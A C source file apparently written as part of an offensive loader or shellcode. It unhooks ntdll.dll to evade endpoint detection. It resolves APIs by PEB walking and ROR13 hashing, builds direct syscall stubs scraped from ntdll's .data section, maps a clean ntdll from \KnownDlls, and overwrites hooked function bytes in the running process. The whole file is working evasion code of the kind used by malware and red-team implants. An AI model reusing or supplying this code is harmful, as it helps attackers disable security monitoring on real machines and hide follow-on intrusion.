#include <windows.h>
#include <stdio.h>
#include <inttypes.h>
#include "lib/libc.h"
#include "lib/addresshunter.h"

// kernel32.dll exports
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR lpcBuffer);
typedef BOOL (WINAPI* VIRTUALPROTECT)(LPVOID a, SIZE_T b, DWORD c, PDWORD d);
typedef LPVOID (WINAPI* VIRTUALALLOC)(LPVOID a, SIZE_T b, DWORD c, DWORD d);
typedef BOOL (WINAPI* GETCOMPUTERNAMEA)(LPSTR lpBuffer, LPDWORD nSize);
typedef VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STR , PCWSTR);
typedef NTSTATUS(NTAPI* _NtOpenSection)(HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES*);
typedef NTSTATUS(NTAPI* _NtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(WINAPI *_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(WINAPI *_NtClose)(HANDLE);

// msvcrt.dll exports
typedef int(WINAPI* PRINTF)(const char* format, ...);
typedef int(WINAPI* SWPRINTF_S)(wchar_t*, size_t, const wchar_t*, ...);


BOOL ah_isalfanum(const char C)
{
    BOOL res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');
    return res;
}



BOOL isForwardedFunc(const void* funcAddr)
{
    char* func = (char*)funcAddr;
    const int max_check = 128;
    BOOL forwarder = TRUE;

    for (int i = 0; func[i] && i < max_check; ++i) {

        if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {
            forwarder = FALSE;
            break;
        }
    }

    return forwarder;
}




ULONG_PTR BuildSyscallStub(ULONG_PTR pStubRegion, DWORD dwSyscallNo, unsigned int Wow64SystemServiceCall) {
#if _WIN64
    int offset = 4;
    BYTE bSyscallStub[] = {
            0x4c, 0x8b, 0xd1,				// mov     r10,rcx
            0xb8, 0x00, 0x00, 0x00, 0x00,	// mov     eax,xxx
            0x0f, 0x05,						// syscall
            0xc3							// ret
};
#else
    int offset = 1;
    BYTE bSyscallStub[] = {
            0xb8, 0x00, 0x00, 0x00, 0x00,	// mov     eax, xxx
            0xba, 0x70, 0x88, 0xcb, 0x77,	// mov     eax, Wow64SystemServiceCall
            0xff, 0xd2,						// call    edx
            0xc2, 0x18, 0x00,				// return
            0x90                            // nop
    };
#endif
    
    mycopy((char*)pStubRegion, (char*)bSyscallStub, sizeof(bSyscallStub));
    *(DWORD*)(pStubRegion + offset) = dwSyscallNo;

#if !_WIN64
    *(DWORD*)(pStubRegion + 6) = Wow64SystemServiceCall;
#endif

    return pStubRegion;
}



BOOL InitKlib(UINT64 *LoadLibraryAFunc, UINT64 *VirtualAllocFunc, UINT64 *VirtualProtectFunc, UINT64 *PrintfFunc, UINT64 *swprintf_sFunc){
    UINT64 kernel32dll, msvcrtdll;
    
    kernel32dll = GetKernel32();

    // get kernel32 functions
    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
    *LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
    if(*LoadLibraryAFunc == 0){
        return FALSE;
    }
    
    CHAR virtualalloc_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0};
    *VirtualAllocFunc = GetSymbolAddress((HANDLE)kernel32dll, virtualalloc_c);
    if(*VirtualAllocFunc == 0){
        return FALSE;
    }

    CHAR virtualprotect_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};
    *VirtualProtectFunc = GetSymbolAddress((HANDLE)kernel32dll, virtualprotect_c);
    if(*VirtualProtectFunc == 0){
        return FALSE;
    }

    //// get msvcrt functions
    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
    msvcrtdll = (UINT64) ((LOADLIBRARYA)*LoadLibraryAFunc)(msvcrt_c);
    
    CHAR printf_c[] = {'p', 'r', 'i', 'n', 't', 'f', 0};
    *PrintfFunc = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    if(*PrintfFunc == 0){
        return FALSE;
    }

    CHAR swprintf_s_c[] = {'s','w','p', 'r', 'i', 'n', 't', 'f','_','s', 0};
    *swprintf_sFunc = GetSymbolAddress((HANDLE)msvcrtdll, swprintf_s_c);
    if(*swprintf_sFunc == 0){
        return FALSE;
    }

    return TRUE;
}



BOOL InitSyscallsFromLdrpThunkSignature(UINT64 VirtualAllocFunc, UINT64 VirtualProtectFunc, UINT64 *NtOpenSectionFunc, UINT64 *NtMapViewOfSectionFunc) {
	_PPEB pPEB;
	#if _WIN64
        pPEB = (_PPEB)__readgsqword(0x60);
    #else
        pPEB = (_PPEB)__readfsdword(0x30);
    #endif

	PPEB_LDR_DATA pPEBLdr = pPEB->pLdr;
	PLDR_DATA_TABLE_ENTRY pLdeNTDLL = NULL;
    CHAR data[] = {'.', 'd', 'a', 't', 'a', 0};

	ULONG_PTR ntdll, val1, val2, val3;
    USHORT usCounter;
    ntdll = (ULONG_PTR)pPEBLdr;
	val1 = (ULONG_PTR)((PPEB_LDR_DATA)ntdll)->InMemoryOrderModuleList.Flink;

	while( val1 ) {
		val2 = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
		usCounter = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.Length;
		val3 = 0;
		do {
			val3 = ror13( (DWORD)val3 );
			if( *((BYTE *)val2) >= 'a' )
				val3 += *((BYTE *)val2) - 0x20;
			else
				val3 += *((BYTE *)val2);
			val2++;
		} while( --usCounter );

		if( (DWORD)val3 == NTDLLDLL_HASH ) {
            pLdeNTDLL = (PLDR_DATA_TABLE_ENTRY)val1;
            break;
        }
        val1 = DEREF( val1 );
    }

	if (pLdeNTDLL == NULL) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLdeNTDLL->DllBase + ((PIMAGE_DOS_HEADER)pLdeNTDLL->DllBase)->e_lfanew);
	PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader);

	ULONG_PTR DataSectionAddress = 0;
	DWORD DataSectionSize;

	for (WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++) {
		if (strcmpC((char*)SectionHeader[i].Name, (char*)data) == 0) {
			DataSectionAddress = (ULONG_PTR)pLdeNTDLL->DllBase + SectionHeader[i].VirtualAddress;
			DataSectionSize = SectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	if (!DataSectionAddress || DataSectionSize < 16 * 5) {
		return FALSE;
	}

    unsigned int Wow64SystemServiceCall = 0;
	DWORD dwNtOpenSection = 0;
	DWORD dwNtMapViewOfSection = 0;

#if _WIN64
        for (UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++) {
            if (*(DWORD*)(DataSectionAddress + uiOffset) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 16) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 32) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 48) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 64) == 0xb8d18b4c) {

                dwNtOpenSection = *(DWORD*)(DataSectionAddress + uiOffset + 48 + 4);
                dwNtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOffset + 64 + 4);
                break;
            }
        }
#else
        for (UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++) {
            if (*(byte*)(DataSectionAddress + uiOffset) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 16) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 32) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 48) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 64) == 0xb8) {
                    
                //*(BYTE*)(DataSectionAddress + uiOffset + 48 + 6) << 24 | *(BYTE*)(DataSectionAddress + uiOffset + 48 + 7) << 16 | *(BYTE*)(DataSectionAddress + uiOffset + 48 + 8) << 8 | *(BYTE*)(DataSectionAddress + uiOffset + 48 + 9);
                Wow64SystemServiceCall = *(DWORD*)(DataSectionAddress + uiOffset + 48 + 6);
                dwNtOpenSection = *(DWORD*)(DataSectionAddress + uiOffset + 48 + 1);
                dwNtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOffset + 64 + 1);
                break;
            }
        }
#endif

	if (dwNtOpenSection == 0 ||dwNtMapViewOfSection == 0) {
		return FALSE;
	}

	ULONG_PTR pSyscallRegion = (ULONG_PTR)((VIRTUALALLOC)VirtualAllocFunc)(NULL, 2 * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!pSyscallRegion) {
		return FALSE;
	}

	*NtOpenSectionFunc = (UINT64)BuildSyscallStub(pSyscallRegion + (1 * MAX_SYSCALL_STUB_SIZE), dwNtOpenSection, Wow64SystemServiceCall);
	*NtMapViewOfSectionFunc = (UINT64)BuildSyscallStub(pSyscallRegion + (2 * MAX_SYSCALL_STUB_SIZE), dwNtMapViewOfSection, Wow64SystemServiceCall);
    if(*NtOpenSectionFunc == 0 || *NtMapViewOfSectionFunc == 0 ){
        return FALSE;
    }
    //NtOpenSection = (_NtOpenSection)BuildSyscallStub(pSyscallRegion + (1 * MAX_SYSCALL_STUB_SIZE), dwNtOpenSection);
	//NtMapViewOfSection = (_NtMapViewOfSection)BuildSyscallStub(pSyscallRegion + (2 * MAX_SYSCALL_STUB_SIZE), dwNtMapViewOfSection);

	DWORD dwOldProtection;
	if(!((VIRTUALPROTECT)VirtualProtectFunc)((LPVOID)pSyscallRegion, 2 * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &dwOldProtection)){
        return FALSE;
    }

	return TRUE;
}



BOOL removeHooks(UINT64 hmodule, UINT64 VirtualProtectFunc, UINT64 NtOpenSectionFunc, UINT64 NtMapViewOfSectionFunc, UINT64 PrintfFunc)
{
    UINT_PTR uiBaseAddress;
    UINT_PTR uiExportDir;
    UINT_PTR uiNameArray;
    UINT_PTR uiAddressArray;
    UINT_PTR uiNameOrdinals;
    DWORD dwCounter;
    PVOID originDll = NULL;    
    UINT64 RtlInitUnicodeStringFunc;
    UINT64 NtCloseFunc;
    UINT64 NtUnmapViewOfSectionFunc;
    //UINT64 NtProtectVirtualMemoryFunc;

    volatile int pe32magic = 0x10b;
    volatile int pe64magic = 0x20b;
    
    NTSTATUS ntStatus;

    CHAR o_c[] = {' ', 'i','s',' ','h','o','o','k','e','d','\n',0};


    CHAR RtlInitUnicodeString_c[] = {'R','t','l','I','n','i','t','U','n','i','c','o','d','e','S','t','r','i','n','g', 0};
    RtlInitUnicodeStringFunc = GetSymbolAddress((HANDLE)hmodule, RtlInitUnicodeString_c);
    if(RtlInitUnicodeStringFunc == 0){
        return FALSE;
    }

    CHAR ntClose_c[] = {'N','t','C','l','o','s','e', 0};
    NtCloseFunc = GetSymbolAddress((HANDLE)hmodule, ntClose_c);
    if(NtCloseFunc == 0){
        return FALSE;
    }
    
    CHAR NtUnmapViewOfSection_c[] = {'N','t','U','n','m','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n', 0};
    NtUnmapViewOfSectionFunc = GetSymbolAddress((HANDLE)hmodule, NtUnmapViewOfSection_c);
    if(NtUnmapViewOfSectionFunc == 0){
        return FALSE;
    }
    
    //CHAR NtProtectVirtualMemory_c[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0};
    //NtProtectVirtualMemoryFunc = GetSymbolAddress((HANDLE)hmodule, NtProtectVirtualMemory_c);
    //if(NtProtectVirtualMemoryFunc == 0){
    //    return FALSE;
    //}

#if _WIN64
    WCHAR knownlib[] = { '\\','K','n','o','w','n','D','l','l','s','\\','n','t','d','l','l','.','d','l','l', 0 };
#else
    WCHAR knownlib[] = { '\\','K','n','o','w','n','D','l','l','s','3','2','\\','n','t','d','l','l','.','d','l','l', 0 };
#endif

    UNICODE_STR ntSectionName;
    ((_RtlInitUnicodeString)RtlInitUnicodeStringFunc)(&ntSectionName, knownlib);

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, &ntSectionName, 0, NULL, NULL);

    HANDLE sectionHandle = NULL;
    ULONG_PTR viewSize = 0;

    ((_NtOpenSection)NtOpenSectionFunc)(&sectionHandle, SECTION_MAP_READ, &ObjectAttributes);
    //NtOpenSection(&sectionHandle, SECTION_MAP_READ, &ObjectAttributes);
    if(sectionHandle == NULL){
        //((PRINTF)PrintfFunc)("[-] NtOpenSection failed");
        return FALSE;
    }

    ((_NtMapViewOfSection)NtMapViewOfSectionFunc)(sectionHandle, NtCurrentProcess(), &originDll, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    //NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &originDll, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    if(originDll == NULL){
        //((PRINTF)PrintfFunc)("[-] NtMapViewOfSection failed");
        ((_NtClose)NtCloseFunc)(sectionHandle);
        return FALSE;
    }

    // parse peb
    uiBaseAddress = (UINT_PTR)(LPVOID)originDll;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe32magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe64magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else
    {
        //((PRINTF)PrintfFunc)("[-] Unable to find process architecture");
        ntStatus = ((_NtUnmapViewOfSection)NtUnmapViewOfSectionFunc)(NtCurrentProcess(), originDll);
	    if (!NT_SUCCESS(ntStatus)) {
	    	//((PRINTF)PrintfFunc)("[-] NtUnmapViewOfSection failed");
	    	return FALSE;
	    }
        ((_NtClose)NtCloseFunc)(sectionHandle);
        return FALSE;
    }

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress;

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames;

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals;

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;
    
    for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))
    {
        char* cpExportedFunctionName = (char*)(uiBaseAddress + DEREF_32(uiNameArray));

        uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;

        // use the functions name ordinal as an index into the array of name pointers
        uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

        // compute the File Offset to the function code
        UINT_PTR funcAddr = uiBaseAddress + DEREF_32(uiAddressArray);

        BOOL isForwarder = isForwardedFunc((const void*)funcAddr);

        if (isForwarder) continue;

        void* funcHooked = (void*)GetSymbolAddress((HANDLE)hmodule, cpExportedFunctionName);

        if (!funcHooked) continue;

        BYTE* p = (BYTE*)funcHooked;
        if (p[0] != 0xe9) {
            if (p[0] != 0xff) continue;
            if (p[1] != 0x25) continue;
        }

        //#if _WIN64 
        //    BOOL funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;
        //#else
        //    BOOL funcIsHooked = (memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0);  // __MINGW32
        //#endif
        BOOL funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;

        if (!funcIsHooked) continue;

        ((PRINTF)PrintfFunc)(cpExportedFunctionName);
        ((PRINTF)PrintfFunc)(o_c);

        ULONG oldProtect;
        ULONG oldProtect1;
        //SIZE_T allocationSize = 64;

        //ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), (void**)&funcHooked, &allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);

        if (!((VIRTUALPROTECT)VirtualProtectFunc)(funcHooked, 64, PAGE_EXECUTE_READWRITE, &oldProtect))
            break;

        mycopy((void*)funcHooked, (void*)funcAddr, 10);

        if (!((VIRTUALPROTECT)VirtualProtectFunc)(funcHooked, 64, oldProtect, &oldProtect1))
            break;

        //ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &funcHooked, &allocationSize, oldProtect, &oldProtect1);
    }

	ntStatus = ((_NtUnmapViewOfSection)NtUnmapViewOfSectionFunc)(NtCurrentProcess(), originDll);
	if (!NT_SUCCESS(ntStatus)) {
		//((PRINTF)PrintfFunc)("[-] NtUnmapViewOfSection failed");
	}

    ((_NtClose)NtCloseFunc)(sectionHandle);

    return TRUE;
}



void unhook()
{  
    UINT64 LoadLibraryAFunc, PrintfFunc, swprintf_sFunc, VirtualAllocFunc, VirtualProtectFunc, NtOpenSectionFunc, NtMapViewOfSectionFunc;

    if(!InitKlib(&LoadLibraryAFunc, &VirtualAllocFunc, &VirtualProtectFunc, &PrintfFunc, &swprintf_sFunc)){
        CHAR test[] = {'[', '-',']' ,'I', 'n', 'i', 't', 0};
        ((PRINTF)PrintfFunc)(test);
        return;
    }else{
        CHAR test[] = {'[', '+',']' ,'I', 'n', 'i', 't', '\n',0};
        ((PRINTF)PrintfFunc)(test);
    }

    // get hooked dll handle
    UINT64 hntdll = GetNtdll();
    if(hntdll == 0){
        CHAR test[] = {'[', '-',']' ,'n', 't', 'd', 'l', 'l', 0};
        ((PRINTF)PrintfFunc)(test);
        return;
    }else{
        CHAR test[] = {'[', '+',']' ,'n', 't', 'd', 'l', 'l', '\n', 0};
        ((PRINTF)PrintfFunc)(test);
    }
    
    // load unhooked dll
    if(!InitSyscallsFromLdrpThunkSignature(VirtualAllocFunc, VirtualProtectFunc, &NtOpenSectionFunc, &NtMapViewOfSectionFunc)){
        CHAR test[] = {'[', '-',']' ,'I', 'n', 'i', 't', '2',  0};
        ((PRINTF)PrintfFunc)(test);
        return;
    }else{
        CHAR test[] = {'[', '+',']' ,'I', 'n', 'i', 't', '2', '\n', 0};
        ((PRINTF)PrintfFunc)(test);
    }
    
    // remove hooks from loaded dll
    if(!removeHooks(hntdll, VirtualProtectFunc, NtOpenSectionFunc, NtMapViewOfSectionFunc, PrintfFunc)){
        CHAR test[] = {'[', '-',']' ,'u', 'n', 'h', 'o', 'o', 'k', 0};
        ((PRINTF)PrintfFunc)(test);
    }else{
        CHAR test[] = {'[', '+',']' ,'u', 'n', 'h', 'o', 'o', 'k', 0};
        ((PRINTF)PrintfFunc)(test);
    }
}
